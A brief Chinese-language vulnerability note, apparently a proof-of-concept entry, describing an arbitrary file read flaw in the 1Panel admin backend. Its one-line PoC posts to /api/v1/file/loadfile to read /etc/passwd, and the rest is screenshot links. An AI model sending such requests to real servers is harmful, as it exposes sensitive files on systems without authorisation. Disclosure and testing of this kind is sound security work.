**漏洞描述**

1Panel后台存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息文件

POC

POST /api/v1/file/loadfile {"paht":"/etc/passwd"}

**漏洞复现**

登陆页面

![image-20230815142616338](./1Panel loadfile 后台文件读取漏洞.assets/image-20230815142616338.png)

![image-20230815142623048](./1Panel loadfile 后台文件读取漏洞.assets/image-20230815142623048.png)

![image-20230815142629323](./1Panel loadfile 后台文件读取漏洞.assets/image-20230815142629323.png)